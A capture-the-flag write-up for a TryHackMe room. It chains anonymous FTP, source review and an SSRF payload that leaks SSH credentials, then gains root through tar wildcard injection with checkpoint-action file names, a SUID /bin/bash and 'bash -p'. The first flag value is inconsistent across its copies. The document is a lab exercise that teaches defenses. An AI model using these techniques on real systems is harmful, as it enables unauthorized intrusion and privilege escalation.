# Operation Coldstart — CTF Writeup

> **Operation Coldstart** — Wake up the staging server everyone left behind.

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Step 1 — Full Port Nmap Scan](#step-1--full-port-nmap-scan)
- [Step 2 — Focused FTP Service Scan](#step-2--focused-ftp-service-scan)
- [Step 3 — Directory Enumeration with Dirb](#step-3--directory-enumeration-with-dirb)
- [Step 4 — Anonymous FTP Login & Backup Download](#step-4--anonymous-ftp-login--backup-download)
- [Step 5 — Reviewing the Leaked Source Code](#step-5--reviewing-the-leaked-source-code)
- [Step 6 — SSRF Exploitation via /preview Endpoint](#step-6--ssrf-exploitation-via-preview-endpoint)
- [Step 7 — SSH Access as webdev & Flag 1](#step-7--ssh-access-as-webdev--flag-1)
- [Step 8 — Enumerating Cron Jobs](#step-8--enumerating-cron-jobs)
- [Step 9 — Identifying the Tar Wildcard Injection Vulnerability](#step-9--identifying-the-tar-wildcard-injection-vulnerability)
- [Step 10 — Exploiting the Wildcard Injection (Explained in Detail)](#step-10--exploiting-the-wildcard-injection-explained-in-detail)
- [Step 11 — Root Shell & Final Flag](#step-11--root-shell--final-flag)
- [Flags Summary](#flags-summary)
- [Vulnerability Summary](#vulnerability-summary)
- [Attack Chain](#attack-chain)
- [Key Takeaways](#key-takeaways)

---

## Challenge Overview

| Field       | Details                                                          |
|-------------|---------------------------------------------------------------------|
| Name        | Operation Coldstart                                                 |
| Platform    | TryHackMe                                                            |
| Category    | FTP Enumeration → SSRF → Linux Privilege Escalation (Cron / Tar Wildcard Injection) |
| Target IP   | 10.48.179.232                                                        |
| Attacker IP | 10.48.74.12                                                          |
| Objective   | Recover credentials from a forgotten staging server and escalate to root |

---

## Step 1 — Full Port Nmap Scan

Started with a full TCP port scan with version detection to map the entire attack surface.

**Command:**
```bash
nmap -sV -p- -sS 10.48.179.232
```

**Scan Results:**

| Port   | State | Service | Version                            |
|--------|-------|---------|--------------------------------------|
| 21/tcp | open  | ftp     | vsftpd 3.0.5                         |
| 22/tcp | open  | ssh     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16   |
| 80/tcp | open  | http    | gunicorn (Python WSGI server)        |

> **Key Observation:** Port 80 is running **gunicorn**, indicating the website is a **Python web application** (likely Flask or Django). FTP being open is also worth a closer look — it's a legacy/forgotten service, fitting the "staging server everyone left behind" theme.

---

## Step 2 — Focused FTP Service Scan

Ran a targeted scan against port 21 with default scripts enabled to check for FTP misconfigurations.

**Command:**
```bash
nmap -sV -p21 -sC -sS 10.48.179.232
```

**Key Output:**
```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
```

> 🎯 **Critical Finding: Anonymous FTP login is allowed.** A `pub` directory is visible and accessible without any credentials — a strong indicator that files were left there for "public" (but unintended) access.

---

## Step 3 — Directory Enumeration with Dirb

Ran Dirb against the web application on port 80 to discover hidden routes.

**Command:**
```bash
dirb http://10.48.179.232
```

**Results:**

| Path       | Status Code | Notes                                    |
|------------|-------------|-------------------------------------------|
| /admin     | 308         | Permanent redirect — likely an admin panel |
| /preview   | 400         | Bad Request — endpoint exists but expects parameters |

> The **400 Bad Request** on `/preview` is a useful signal: the route exists and is actively validating input, meaning it expects one or more query parameters to function correctly.

---

## Step 4 — Anonymous FTP Login & Backup Download

Connected to the FTP service using the `anonymous` account confirmed accessible in Step 2.

**Commands:**
```bash
ftp 10.48.179.232
```
```
Name: anonymous
Password: (blank/anything)
```

> **Note:** Anonymous FTP conventionally accepts any value (often blank or an email-like string) as the password once the username `anonymous` is supplied.

**Browsed and downloaded the available file:**
```ftp
ls
cd pub
ls
get backup.tar.gz
```

> **Command Breakdown:**
> - `ls` — Lists files/directories in the current FTP location
> - `cd pub` — Changes into the `pub` directory
> - `get backup.tar.gz` — Downloads the file to the local attacking machine

**Result:** Successfully downloaded `backup.tar.gz` (2,446 bytes) — a compressed backup archive left exposed on a public-facing service.

---

## Step 5 — Reviewing the Leaked Source Code

Extracted the downloaded archive on the attacking machine to inspect its contents.

**Command:**
```bash
tar -xzf backup.tar.gz
```


The archive contained the application's source code, including **`app.py`** — the Flask/Python web application running on port 80.

> **What the source code review revealed:**
> - The `/preview` route (found earlier via Dirb) accepts a `url` query parameter and makes a **server-side HTTP request** to whatever address is supplied — with no validation or allow-list restricting it to safe/external destinations.
> - This is a textbook **Server-Side Request Forgery (SSRF)** vulnerability: the server itself can be tricked into fetching internal-only resources on the attacker's behalf.
> - The source also pointed to an internal-only hostname, **`kestrel.thm`**, hosting an admin notes page — a resource not directly reachable from outside the network, but reachable *from the server itself*.

---

## Step 6 — SSRF Exploitation via /preview Endpoint

Abused the SSRF vulnerability identified in the source code to make the server fetch the internal admin notes page on our behalf.

**Payload (browser URL):**
```
http://10.48.179.232/preview?url=http://kestrel.thm/admin/notes
```

> **Payload Breakdown:**
> - `10.48.179.232/preview` — The public-facing vulnerable endpoint we can reach directly
> - `?url=http://kestrel.thm/admin/notes` — The SSRF payload: instructs the server to internally fetch `http://kestrel.thm/admin/notes` and return its content to us
>
> Because `kestrel.thm` is only resolvable/reachable **from the server's own network position**, we cannot browse to it directly — but by routing the request *through* the vulnerable `/preview` proxy, the server fetches it for us and reflects the response back, completely bypassing the network-level restriction.

**Response — leaked internal notes:**
```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

> 🔑 **Credentials Found:**
> - **Username:** `webdev`
> - **Password:** `V0ltLabs#summer`

---

## Step 7 — SSH Access as webdev & Flag 1

Used the leaked credentials to SSH into the target.

**Command:**
```bash
ssh webdev@10.48.179.232
```

Once authenticated, listed the home directory and read the first flag.

**Commands:**
```bash
ls
cat user.txt
```

**Output:**
```
user.txt

THM{96dc7bd50d2fb98fcece0156xx88b5ab}
```

> 🚩 **Flag 1:** `THM{96dc7bd50d2fb98fcxxe01560788b5ab}`

---

## Step 8 — Enumerating Cron Jobs

Checked the system-wide cron directory for any scheduled tasks that might run with elevated privileges.

**Commands:**
```bash
cd /etc/cron.d
ls
cat voltlabs-backup
```

**Output:**
```

# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

> **Cron Line Breakdown:**
> - `* * * * *` — Standard cron schedule syntax (minute, hour, day-of-month, month, day-of-week). All asterisks means **every single minute**.
> - `root` — The job runs as the **root** user
> - `cd /opt/backups && tar czf /var/backups/uploads.tgz *` — Changes into `/opt/backups`, then archives **every file in the current directory** (`*`) into `/var/backups/uploads.tgz` using `tar`
>
> 🎯 **This is a privileged, automated, root-owned command that we may be able to influence.**

---

## Step 9 — Identifying the Tar Wildcard Injection Vulnerability

Checked the permissions on the `/opt/backups` directory referenced in the cron job.

**Command:**
```bash
ls -la /opt/backups
```

**Output:**
```
drwxrwx--- 2 webdev webdev 4096 May  9 23:14 .
drwxr-xr-x 4 root   root   4096 May  9 23:14 ..
-rw-r--r-- 1 webdev webdev   12 May  9 23:14 .keep
```

> 🎯 **Critical Finding:** The `webdev` user **owns** `/opt/backups` and has **full read/write/execute permission** (`rwx`) on it — meaning we can create, modify, or delete files inside this directory.
>
> Combined with the cron job's use of an **unquoted wildcard (`*`)** in a `tar` command run as root, this is a classic and well-known privilege escalation pattern called **Tar Wildcard Injection**.
>
> **Why this is dangerous:** When the shell expands `*` inside `/opt/backups`, it is replaced with the names of every file in that directory, **in alphabetical order**, as separate arguments to `tar`. If we create files whose names *start with a dash* (`-`), `tar`'s argument parser will interpret them as **command-line options** instead of literal filenames to archive — giving us a way to inject our own flags into a command that root executes automatically, every minute.

---

## Step 10 — Exploiting the Wildcard Injection (Explained in Detail)

This is the core of the privilege escalation. Below is every command used, broken down individually so the logic is fully clear.

### 10.1 — Create the payload script

```bash
echo 'chmod u+s /bin/bash' > shell.sh
chmod +x shell.sh
```

> - `echo 'chmod u+s /bin/bash' > shell.sh` — Creates a script that, when executed, sets the **SUID (Set User ID) bit** on `/bin/bash`. Once set, **any user** can run `/bin/bash` and it will execute with the **privileges of the file's owner** — in this case, root (since root will be the one creating/owning the file when it sets this bit, as the command itself runs as root).
> - `chmod +x shell.sh` — Makes the script executable.
>
> This script is the **payload** we want root to execute on our behalf.

### 10.2 — Create the maliciously-named "trigger" files

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

> **Why `touch --` is used:**
> The `--` argument is a universal convention in Linux command-line tools meaning **"stop parsing flags — treat everything after this as a literal argument/filename."**
>
> Without `--`, running `touch '--checkpoint=1'` would cause `touch` itself to try to interpret `--checkpoint=1` as one of *its own* command-line options (which doesn't exist), resulting in an error instead of creating a file with that literal name.
>
> With `touch -- '--checkpoint=1'`, we are telling `touch`: *"Ignore the fact that this looks like a flag — just create a file with this exact name."* This successfully creates two files:
> - A file literally named `--checkpoint=1`
> - A file literally named `--checkpoint-action=exec=sh shell.sh`
>
> **Why these specific names matter (these are real `tar` options):**
> - `--checkpoint=1` — Tells `tar` to trigger a "checkpoint" event after every **1** record processed (i.e., almost immediately, on the very first file it touches).
> - `--checkpoint-action=exec=sh shell.sh` — Tells `tar` that when a checkpoint is reached, it should **execute** the shell command `sh shell.sh`.
>
> When used together, these two options cause `tar` to **run an arbitrary external command** during its own execution — a legitimate, documented `tar` feature being abused for code execution.

### 10.3 — How the cron job becomes the trigger

Recall the cron job runs, every minute, as root:
```bash
cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

Because the shell expands `*` to the contents of the directory **before** `tar` even runs, the actual command executed by root becomes (alphabetically expanded):

```bash
tar czf /var/backups/uploads.tgz '--checkpoint-action=exec=sh shell.sh' '--checkpoint=1' .keep shell.sh
```

> `tar` then parses `--checkpoint-action=exec=sh shell.sh` and `--checkpoint=1` not as filenames to archive, but as **genuine flags**, because that is exactly how `tar`'s argument parser is designed to work — it cannot tell the difference between flags supplied directly by an admin and flags that arrived via wildcard expansion.
>
> The result: **root executes `sh shell.sh`** — and since `shell.sh` contains `chmod u+s /bin/bash`, root sets the SUID bit on `/bin/bash`.

### 10.4 — Verifying the files are in place

```bash
ls -la
```

**Output:**
```
-rw-rw-r-- 1 webdev webdev    0 Jun 21 12:01 '--checkpoint-action=exec=sh shell.sh'
-rw-rw-r-- 1 webdev webdev    0 Jun 21 12:01 '--checkpoint=1'
-rwxrwxr-x 1 webdev webdev   20 Jun 21 12:00  shell.sh
```

> All three files are confirmed in place inside `/opt/backups`. Now we simply **wait for the next minute** for the cron job to fire automatically.

### 10.5 — Catching the privilege escalation with `bash -p`

```bash
bash -p
```

> **Why `bash -p` instead of just `bash`?**
> By default, Bash includes a security feature: if it detects that the **real UID** (the user who launched it, e.g., `webdev`) differs from the **effective UID** (the elevated privilege granted by a SUID bit, e.g., `root`), it **automatically drops the elevated privilege** back down to the real UID for safety.
>
> The `-p` ("privileged") flag tells Bash: **"Do not drop the effective UID — keep running with the elevated privilege."**
>
> Since `/bin/bash` now has the SUID bit set (thanks to our cron-triggered payload), running `bash -p` launches a shell that **keeps** root's effective privileges instead of silently discarding them.

---

## Step 11 — Root Shell & Final Flag

After the cron job fired and `bash -p` was executed, confirmed root access and retrieved the final flag.

**Commands:**
```bash
whoami
pwd
cd /
ls
cd root
ls
cat flag.txt
```

**Output:**
```
root

/opt/backups

flag.txt  snap

THM{e6ee84a483d67ade06936fcfd1433e8a}
```

> 🚩 **Final Flag (root):** `THM{e6ee84a483d67ade06936fcfd1433e8a}`

---

## Flags Summary

| # | Flag                                       | User Context | Method                                          |
|---|---------------------------------------------|---------------|---------------------------------------------------|
| 1 | `THM{96dc7bd50d2fb98fcece01560788b5ab}`     | webdev        | SSRF via `/preview` endpoint → leaked SSH creds  |
| 2 | `THM{e6ee84a483d67ade06936fcfd1433e8a}`     | root          | Tar wildcard injection via root cron job         |

---

## Vulnerability Summary

| # | Vulnerability                          | Location                          | Impact                                         |
|---|------------------------------------------|------------------------------------|--------------------------------------------------|
| 1 | Anonymous FTP login enabled              | Port 21 (vsftpd)                   | Leaked application backup/source code           |
| 2 | Application source code exposed          | `backup.tar.gz` → `app.py`         | Revealed SSRF vulnerability and internal hostname |
| 3 | Server-Side Request Forgery (SSRF)       | `/preview?url=`                    | Accessed internal-only admin notes page          |
| 4 | Plaintext credentials in internal notes  | `http://kestrel.thm/admin/notes`   | Leaked SSH credentials for `webdev`              |
| 5 | World-writable directory used by root cron job | `/opt/backups`               | Enabled wildcard injection into root-run `tar`   |
| 6 | Unsanitised wildcard in privileged cron command | `tar czf ... *`               | Arbitrary command execution as root              |

---

## Attack Chain

```
Nmap → Port 21 (FTP), 22 (SSH), 80 (gunicorn/Flask)
→ Anonymous FTP login → download backup.tar.gz
→ Extract → review app.py → discover SSRF in /preview
→ SSRF: /preview?url=http://kestrel.thm/admin/notes
→ Leaked creds: webdev / V0ltLabs#summer
→ SSH login → Flag 1
→ Enumerate /etc/cron.d → voltlabs-backup (root, every minute, tar * )
→ /opt/backups writable by webdev
→ Create shell.sh (chmod u+s /bin/bash)
→ Create --checkpoint=1 and --checkpoint-action=exec=sh shell.sh
→ Cron fires → tar executes shell.sh as root → SUID set on /bin/bash
→ bash -p → root shell → Flag 2
```

---

## Key Takeaways

- **Disable anonymous FTP access** unless absolutely required, and never store backups or source code where it can be reached anonymously
- **Leaked source code is a goldmine for attackers** — it can reveal vulnerable endpoints, hardcoded logic, and internal infrastructure details that would otherwise stay hidden
- **Always validate and allow-list URLs** in any feature that performs server-side HTTP requests (link previews, webhooks, image fetchers, etc.) to prevent SSRF
- **Internal-only services should still require authentication** — relying purely on network position ("nobody outside can reach it") is defeated the moment any SSRF vector exists on a reachable host
- **Never store plaintext credentials in internal notes or wikis** accessible over HTTP, even if "only meant for internal use"
- **Avoid unquoted wildcards (`*`) in privileged scripts**, especially when the wildcard expands inside a directory writable by a lower-privileged user — `tar`, `chown`, `rsync`, and several other common tools are all vulnerable to this same class of wildcard injection
- Directories used by root-owned cron jobs or scheduled tasks should **never** be writable by non-root users

---

*Writeup by: [showrya] | Platform: TryHackMe | Room: Operation Coldstart*
